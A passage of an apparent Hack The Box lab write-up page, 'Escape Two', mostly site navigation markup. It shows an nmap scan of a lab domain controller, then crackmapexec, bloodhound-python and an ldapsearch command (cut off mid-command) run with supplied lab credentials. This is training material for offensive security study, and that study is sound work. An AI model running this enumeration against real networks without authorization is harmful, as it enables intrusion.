@@ -1,0 +1,1121 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Inject" href="../inject/inject.html" /><link rel="prev" title="Dog" href="../dog/dog.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Escape Two - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=8f2a1f02" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/active-directory-enum-and-attacks/active-directory-enum-and-attacks.html">Active Directory Enum and Attacks</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/vintage/vintage.html">Vintage</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../medium/medium.html">Medium</a><input class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/administrator/administrator.html">Administrator</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/shared/shared.html">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/thefrizz/thefrizz.html">The Frizz</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 current has-children"><a class="reference internal" href="../easy.html">Easy</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="../analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../code/code.html">Code</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../dog/dog.html">Dog</a></li>
+<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Escape Two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <section id="escape-two">
+<h1>Escape Two<a class="headerlink" href="#escape-two" title="Permalink to this heading">#</a></h1>
+<section id="initial-enumeration">
+<h2>Initial Enumeration<a class="headerlink" href="#initial-enumeration" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.10.11.51<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.initial
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-08 11:56 GMT
+Stats: 0:00:09 elapsed; 0 hosts completed (0 up), 0 undergoing Host Discovery
+Parallel DNS resolution of 1 host. Timing: About 0.00% done
+Nmap scan report for 10.10.11.51
+Host is up (0.18s latency).
+Not shown: 987 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-08 11:56:59Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-03-08T11:58:26+00:00; 0s from scanner time.
+| ssl-cert: Subject: commonName=DC01.sequel.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.sequel.htb
+| Not valid before: 2024-06-08T17:35:00
+|_Not valid after:  2025-06-08T17:35:00
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-03-08T11:58:26+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=DC01.sequel.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.sequel.htb
+| Not valid before: 2024-06-08T17:35:00
+|_Not valid after:  2025-06-08T17:35:00
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2025-03-08T05:52:27
+|_Not valid after:  2055-03-08T05:52:27
+|_ssl-date: 2025-03-08T11:58:26+00:00; +1s from scanner time.
+|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.sequel.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.sequel.htb
+| Not valid before: 2024-06-08T17:35:00
+|_Not valid after:  2025-06-08T17:35:00
+|_ssl-date: 2025-03-08T11:58:26+00:00; +1s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.sequel.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.sequel.htb
+| Not valid before: 2024-06-08T17:35:00
+|_Not valid after:  2025-06-08T17:35:00
+|_ssl-date: 2025-03-08T11:58:26+00:00; +1s from scanner time.
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2025-03-08T11:57:51
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 137.97 seconds
+</pre></div>
+</div>
+</section>
+<section id="enumerating-ldap">
+<h2>Enumerating LDAP<a class="headerlink" href="#enumerating-ldap" title="Permalink to this heading">#</a></h2>
+<p>We’re given those creds at the beginning of the engagement <code class="docutils literal notranslate"><span class="pre">rose:KxEPkKe6R8su</span></code></p>
+<p>Rose has ldap access</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cme<span class="w"> </span>ldap<span class="w"> </span><span class="m">10</span>.10.11.51<span class="w"> </span>-u<span class="w"> </span>rose<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;KxEPkKe6R8su&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>SMB<span class="w">         </span><span class="m">10</span>.10.11.51<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span>.0<span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:sequel.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
+LDAP<span class="w">        </span><span class="m">10</span>.10.11.51<span class="w">     </span><span class="m">389</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>sequel.htb<span class="se">\r</span>ose:KxEPkKe6R8su
+</pre></div>
+</div>
+<p>So we can use a bloodhound injester</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>bloodhound-python<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-u<span class="w"> </span>rose<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-p<span class="w"> </span><span class="s1">&#39;KxEPkKe6R8su&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-c<span class="w"> </span>All<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span>sequel.htb<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--dns-timeout<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-ns<span class="w"> </span><span class="m">10</span>.10.11.51
+</pre></div>
+</div>
+<p>Starting bloodhound-ce and uploading data to it</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>docker<span class="w"> </span>compose<span class="w"> </span>pull<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>docker<span class="w"> </span>compose<span class="w"> </span>up
+</pre></div>
+</div>
+<p>Also get a list of users manually with ldapsearch</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">type</span><span class="o">=</span>user
+ldapsearch<span class="w"> </span>-x<span class="w"> </span>-LLL<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span>ldap://10.10.11.51:389<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-b<span class="w"> </span><span class="s2">&quot;CN=users,DC=sequel,DC=htb&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-D<span class="w"> </span><span class="s1">&#39;rose@sequel.htb&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-w<span class="w"> </span><span class="s1">&#39;KxEPkKe6R8su&#39;</span><span class="w"> </span><span class="se">\</span>
